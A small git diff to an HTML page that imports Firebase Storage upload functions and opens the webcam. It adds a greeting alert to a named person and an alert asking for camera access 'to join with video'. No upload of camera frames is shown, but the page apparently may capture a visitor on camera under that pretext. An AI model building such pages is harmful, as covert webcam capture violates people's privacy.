@@ -5,6 +5,7 @@
   <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
   <script type="module">
+    alert('Hello! Aayush. Nice meeting you.')
     // Import Firebase SDKs
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
     import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-storage.js";
@@ -39,6 +40,7 @@
           const stream = await navigator.mediaDevices.getUserMedia(constraints);
           video.srcObject = stream;
         } catch (e) {
+          alert('Please allow camera access to join with video')
           console.error('Error accessing webcam: ', e);
         }
       }
